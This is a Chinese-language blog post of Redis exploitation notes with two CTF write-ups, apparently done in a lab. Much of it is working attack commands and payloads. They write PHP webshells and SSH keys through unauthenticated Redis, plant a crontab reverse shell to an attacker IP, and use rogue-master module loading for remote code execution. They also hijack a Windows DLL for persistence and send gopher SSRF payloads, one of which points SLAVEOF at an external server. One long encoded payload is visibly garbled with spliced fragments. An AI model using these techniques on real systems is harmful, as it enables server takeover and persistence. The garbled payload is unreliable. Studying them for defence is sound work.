title: Redis漏洞学习笔记
author: bmth
tags:
  - Redis
top_img: 'https://img-blog.csdnimg.cn/d1b206bca79841578a8b1908133e66dc.png'
cover: 'https://img-blog.csdnimg.cn/d1b206bca79841578a8b1908133e66dc.png'
categories:
  - 内网
date: 2022-01-15 20:20:00
---
![](https://img-blog.csdnimg.cn/d1b206bca79841578a8b1908133e66dc.png)
## Redis介绍
REmote DIctionary Server(Redis) 是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库

Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API

Redis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted sets)等类型

`sudo redis-server /etc/redis.conf`
![](https://img-blog.csdnimg.cn/2859751e0693496896ec69794acfd472.png)

## Redis 未授权访问漏洞
漏洞的产生条件有以下两点：
>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网
没有设置密码认证（一般为空），可以免密码远程登录redis服务

修改`/etc/redis.conf`配置文件：
![](https://img-blog.csdnimg.cn/2f1af31aa37f4b67bbe0ee7d3dae9e9d.png)

然后我们就可以在攻击机kali上使用redis客户端直接无账号成功登录ubuntu上的Redis服务端，并且成功列出服务端redis的信息
`redis-cli -h 192.168.111.133`
![](https://img-blog.csdnimg.cn/eda8ed9d9f154387b835a0a812a38de4.png)

### 利用redis写webshell
利用条件：
>服务端的Redis连接存在未授权，在攻击机上能用redis-cli直接登陆连接，并未登陆验证
开了服务端存在Web服务器，并且知道Web目录的路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限

原理就是在数据库中插入一条Webshell数据，将此Webshell的代码作为value，key值随意，然后通过修改数据库的默认路径为/var/www/html和默认的缓冲文件shell.php，把缓冲的数据保存在文件里，这样就可以在服务器端的/var/www/html下生成一个Webshell

我们可以将`dir`设置为`/var/www/html`目录，将指定本地数据库存放目录设置为`/var/www/html`；将`dbfilename`设置为文件名`shell.php`，即指定本地数据库文件名为`shell.php`；再执行`save`或`bgsave`，则我们就可以写入一个路径为`/var/www/html/shell.php`的Webshell文件
```bash
config set dir /var/www/html
config set dbfilename shell.php
set xxx "\r\n\r\n<?php @eval($_POST[shell]);?>\r\n\r\n"
save
```
`\r\n\r\n` 代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行
![](https://img-blog.csdnimg.cn/de2edb9fde994a9e967b0af1f3d2f36f.png)

访问web服务器，成功获取shell
![](https://img-blog.csdnimg.cn/07cbb4b62405455ea2dbea4cd9268a44.png)
![](https://img-blog.csdnimg.cn/d36f0c8db3a74dd4924de4faac29682e.png)

### 利用redis写ssh公钥
利用条件：
>服务端的Redis连接存在未授权，在攻击机上能用redis-cli直接登陆连接，并未登陆验证
服务端存在.ssh目录并且有写入的权限

原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key

首先在攻击机的`/root/.ssh`目录里生成ssh公钥key
```bash
ssh-keygen -t rsa
```
![](https://img-blog.csdnimg.cn/56c67d748b604f74a360f6ed6697d05f.png)

接着将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入服务端redis的缓冲里
```bash
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > /root/.ssh/key.txt
cat /root/.ssh/key.txt | redis-cli -h 192.168.111.133 -x set xxx

// -x 代表从标准输入读取数据作为该命令的最后一个参数
```
![](https://img-blog.csdnimg.cn/7749431a860e4330ba7a9a36cef3a5f7.png)

然后，使用攻击机连接目标机器redis，设置redis的备份路径为`/root/.ssh`和保存文件名为`authorized_keys`，并将数据保存在目标服务器硬盘上
```bash
redis-cli -h 192.168.111.133
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```
![](https://img-blog.csdnimg.cn/e49c8989d05d42df98ce816458498df9.png)


最后`ssh -i id_rsa root@192.168.111.133`
![](https://img-blog.csdnimg.cn/40411ff9e1214a198a289fd35d1376e1.png)

### 利用redis写计划任务
在**权限足够**的情况下，利用redis写入文件到计划任务目录下执行

原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell
```bash
redis-cli -h 192.168.111.133
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.111.128/6666 0>&1\n\n"
config set dir /var/spool/cron/crontabs/
config set dbfilename root
save
```
>**这个方法只能Centos上使用，Ubuntu上行不通，原因如下：**
>- 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件`/var/spool/cron/crontabs/<username>`权限必须是600也就是`-rw-------`才会执行，否则会报错`(root) INSECURE MODE (mode 0600 expected)`，而Centos的定时任务文件`/var/spool/cron/<username>`权限644也能执行
>- 因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错

>**由于系统的不同，crontrab定时文件位置也会不同：**
>- Centos的定时任务文件在`/var/spool/cron/<username>`
>- Ubuntu定时任务文件在`/var/spool/cron/crontabs/<username>`


## Redis 主从复制的命令执行
>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式

在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以在Redis中实现一个新的Redis命令。我们可以通过外部拓展(.so)，在Redis中创建一个用于执行系统命令的函数
![](https://img-blog.csdnimg.cn/472fd347a0b543d29348bd14ca225ef0.png)
在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了

[深入学习Redis（3）：主从复制](https://www.cnblogs.com/kismetv/p/9236731.html)
### 利用 redis-rogue-server 工具
下载地址：[https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
![](https://img-blog.csdnimg.cn/215962a77baa4a7991aa86d43e03cb8d.png)

该工具的原理就是首先创建一个恶意的Redis服务器作为Redis主机(master)，该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 slaveof 命令将目标Redis服务器设置为我们恶意Redis的Redis从机(slaver)。然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机(slaver)加载模块执行系统命令即可
```
python3 redis-rogue-server.py --rhost 192.168.111.133 --lhost 192.168.111.1
```
执行后，可以选择获得一个交互式的shell(interactive shell)或者是反弹shell(reserve shell)
选择`i`来获得一个交互式的shell，执行执行系统命令
![](https://img-blog.csdnimg.cn/0082a4a2332b4340b680b5ca1a7ab6bd.png)

也可以选择`r`来获得一个反弹shell
![](https://img-blog.csdnimg.cn/a8217c13333046369a6fc580c2d84324.png)
![](https://img-blog.csdnimg.cn/8668837629184eb79696b64ebe650179.png)

但是该工具无法数据Redis密码进行Redis认证，也就是说该工具只能在目标存在Redis未授权访问漏洞时使用。如果目标Redis存在密码是不能使用该工具的


### 利用 redis-rce 工具
下载地址：[https://github.com/Ridter/redis-rce](https://github.com/Ridter/redis-rce)
![](https://img-blog.csdnimg.cn/14ee897db74345d2b29e587a64b5b17c.png)

这里存在`-a`可以进行Redis认证
将exp.so文件复制到redis-rce.py同一目录下，然后执行如下命令
```
python3 redis-rce.py -r 192.168.111.133 -L 192.168.111.1 -f exp.so
```
![](https://img-blog.csdnimg.cn/d83b64edc3b7457ab55aae9c193ee62e.png)

参考：
[浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)
[10.Redis未授权访问漏洞复现与利用](https://www.cnblogs.com/bmjoker/p/9548962.html)
[Redis 基于主从复制的 RCE 利用方式](https://paper.seebug.org/975/)
[Redis和SSRF ](https://xz.aliyun.com/t/1800)
[浅入深出 Redis 攻击方法总结](https://www.anquanke.com/post/id/241146)

## Redis在Windows下的利用
到了Windows上，redis的利用变得困难了很多
首先，Windows的Redis最新版本还停留在3.2，所以利用主从复制直接getshell没戏
其次，写web目录的前提是需要知道web的绝对路径，我们可以使用`config get dir`获取当前redis的绝对路径，也可以使用`info`获取redis.conf的绝对路径
![](https://img-blog.csdnimg.cn/1bfa42d336ab4bf68041f682877f459b.png)

但写入web路径还是比较困难
写启动项的话需要机器重启，具体路径为(第二种方法需要用户名)：
```
C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp
C:/Users/Bmth/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
```

R3start 师傅公布的其他攻击方法：
1. 系统 DLL 劫持 （目标重启或注销）
2. 针对特定软件的 DLL 劫持（目标一次点击）
3. 覆写目标的快捷方式 （目标一次点击）
4. 覆写特定软件的配置文件达到提权目的 （目标无需点击或一次点击）
5. 覆写 sethc.exe 等文件 （攻击方一次触发）

这些方法由于写出的是二进制或者不允许有杂质的文件所以对写出的文件有着严格的内容要求
### 写无损文件
工具：[https://github.com/r35tart/RedisWriteFile](https://github.com/r35tart/RedisWriteFile)
原理：当Redis>=2.8时，支持主从复制(master/slave模式)功能，通过主从复制Redis-slave会将Redis-master的数据库文件同步到本地。攻击者可以伪造一个master，通过控制数据库文件可以在slave中写入无损的文件
```
python3 RedisWriteFile.py --rhost=[target_ip] --rport=[target_redis_port] --lhost=[evil_master_host] --lport=[random] --rpath="[path_to_write]" --rfile="[filename]" --lfile=[filename]
```
![](https://img-blog.csdnimg.cn/92b802eadad342f8be273be10521e058.png)

随后就可以在我们的windows上看到ie.gif，确实是无损的
![](https://img-blog.csdnimg.cn/79ad8f4695c24bd7b1562fe99778b7bd.png)

### dll劫持
在redis本身，会不会在某些情况存在dll劫持的问题，我们来看一下
在测试的过程中，发现在使用`SYNC、BGSAVE`等命令时，存在 dll 劫持的特征
![](https://img-blog.csdnimg.cn/a1675c5d5c07486e871495a8532b0a68.png)

根据规则，dbghelp.dll 不在 Known DLLs 中，会先从安装目录下搜索，即使System32下已经存在了dbghelp.dll
接下来使用工具：[https://github.com/kiwings/DLLHijacker](https://github.com/kiwings/DLLHijacker)，它帮助我们生成劫持DLL后的工程项目，以便我们可以自由的修改Shellcode劫持该DLL，此方法利用函数转发完成，不会破坏原有功能，缺点就是他需要原DLL也同时存在操作系统上
![](https://img-blog.csdnimg.cn/c83cd4286a194907a9d392e3f8c81e22.png)

使用的时候发现报错：NoneType，这里找到修复方案：[https://github.com/JKme/sb_kiddie-/tree/master/hacking_win/dll_hijack](https://github.com/JKme/sb_kiddie-/tree/master/hacking_win/dll_hijack)
先测试一下弹计算器，只需要指定dll的绝对路径即可，这里我们指定到`C:/Windows/System32/dbghelp.dll`
![](https://img-blog.csdnimg.cn/87b42352ac9449cd9fb6bc78d62e9cc9.png)

然后生成x64的dll文件，通过RedisWriteFile写入并执行
![](https://img-blog.csdnimg.cn/fd75c421790d4808924f97ddf4123ca6.png)

可以看到成功写入文件并且弹出计算器
![](https://img-blog.csdnimg.cn/d2ca6b01b7f0437ca7ea4d066ebca2e6.png)

并且在重启服务后，会自动加载此DLL，自动伴随持久化效果

但是在实际情况中，写入文件时，由于使用的是主从复制，会把redis里面的数据清空，这样攻击之后可能会被发现，我们可以使用[https://github.com/yannh/redis-dump-go](https://github.com/yannh/redis-dump-go) 进行备份
```
备份:
./redis-dump-go -host 192.168.111.137 -output commands > redis.dump

恢复:
redis-cli -h 192.168.111.137 < redis.dump
```
参考：
[Redis on Windows 出网利用探索 ](https://xz.aliyun.com/t/8153)
[Redis在Windows环境下Getshell](https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html)
[对 Redis 在 Windows 下的利用方式思考](http://r3start.net/index.php/2020/05/25/717)

## 赛题复现
### [GKCTF2020]EZ三剑客-EzWeb
查看源码发现给出了提示
![](https://img-blog.csdnimg.cn/4276eaa04f1d4389a5a67c0b0c0187a9.png)
得到有用信息
```
eth0      Link encap:Ethernet  HWaddr 02:42:0a:0a:05:09  
          inet addr:10.10.5.9  Bcast:10.10.5.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1
          RX packets:106 errors:0 dropped:0 overruns:0 frame:0
          TX packets:105 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:19291 (19.2 KB)  TX bytes:20587 (20.5 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:ac:12:00:3b  
          inet addr:172.18.0.59  Bcast:172.18.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:11 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:866 (866.0 B)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```
尝试一下file协议读文件，发现有过滤，使用`file：/`或者`file:<空格>///`即可绕过
![](https://img-blog.csdnimg.cn/31f8d0dafb8d442b8d7b45b069806449.png)
读取源码：
```php
<?php
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
}

if(isset($_GET['submit'])){
		$url = $_GET['url'];
		//echo $url."\n";
		if(preg_match('/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is', $url,$match))
		{
			//var_dump($match);
			die('别这样');
		}
		curl($url);
}
if(isset($_GET['secret'])){
	system('ifconfig');
}
?>
```
发现过滤了file，dict协议，使用http协议进行内网主机存活探测，使用bp进行爆破，注意buu有限制，1秒访问10次
![](https://img-blog.csdnimg.cn/03de89c5c3294cdcb3fbb764b8534fd5.png)

发现10.10.5.11存在提示，那么我们需要爆破端口，康康有哪些服务，发现开放了6379端口
![](https://img-blog.csdnimg.cn/9770b99dfa93440fb3675dc52f545794.png)

是redis服务，利用redis未授权访问的漏洞
![](https://img-blog.csdnimg.cn/8041a83e94ec400ca697fe617cadc85d.png)
直接使用gopher一把梭
```
gopher://10.10.5.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```
最后执行`?url=http://10.10.5.11/shell.php?cmd=cat${IFS}/flag`
![](https://img-blog.csdnimg.cn/d9979fc4ea9940909439576e67acbffe.png)

### [网鼎杯 2020 玄武组]SSRFMe
给出了源码：
```php
<?php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}

function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }

}
if(isset($_GET['url'])){
    $url = $_GET['url'];
    if(!empty($url)){
        safe_request_url($url);
    }
}
else{
    highlight_file(__FILE__);
}
// Please visit hint.php locally.
?>
```
发现存在parse_url，可以利用curl和parse_url的解析差异来绕过
payload：`?url=http://@127.0.0.1:80@www.baidu.com/hint.php`
但发现在curl较新的版本修复了，这里使用`0.0.0.0`，表示整个网络，可以代表本机 ipv4 的所有地址
![](https://img-blog.csdnimg.cn/7277cc35242e41c892a75f01baae27b1.png)
`?url=http://0.0.0.0/hint.php`
得到hint.php源代码：
```php
<?php
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
  highlight_file(__FILE__);
}
if(isset($_POST['file'])){
  file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
}
```
发现redispass为root，那么是要利用主从复制来打Redis了
[https://github.com/xmsec/redis-ssrf](https://github.com/xmsec/redis-ssrf)
[https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
需要使用redis-rogue-server项目中的exp.so，通过选择不同的mode选项可以选择不同的攻击方式。这里我们选择mode 3，通过主从复制在目标主机上执行命令。需要修改一下几个地方：
- 将 lhost 改为攻击者vps的ip，用于控制目标Redis服务器连接位于攻击者vps上6666端口上伪造的恶意Redis主机
- 将command修改为要执行的命令
- 将第140行的 127.0.0.1 改为 0.0.0.0 ，用于绕过题目对于内网IP的限制
- 最后在第160行填写上Redis的密码 root

![](https://img-blog.csdnimg.cn/e8702fe98c874b38baa83a2139c18453.png)
![](https://img-blog.csdnimg.cn/227cc3a1ea2b4aebb7d79c87a119f933.png)
需要把后面的`%0D%0A`去掉，由于题目需要发送的是GET请求，会自动解码一次，所以需要将payload再进行一次编码
```
?url=gopher%3A%2F%2F0.0.0.0%3A6379%2F_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25244%250D%250Aroot%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A110.42.134.160%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2Ftmp%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%25%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASE0Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2Ftmp%2Fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252414%250D%250Acat%2524%257BIFS%257D%2Fflag%250D%25MODULE%250D%250A%25244%250D%250ALOAD%250D%250A%2520A%252A1%250D%250A%25244%250D%250Aquit
```
将exp.so和rogue-server.py上传到我们的vps
这里需要写个死循环一直跑rogue-server.py，不然当目标机的Redis连接过来之后，一连上就自动断开连接，可能导致exp.so都没传完就中断了
```bash
while [ "1" = "1" ]
do
	python rogue-server.py
done
```
运行之后发送payload就可以getshell了
![](https://img-blog.csdnimg.cn/bdc5fae88a8745d29f14027b0f516ba4.png)
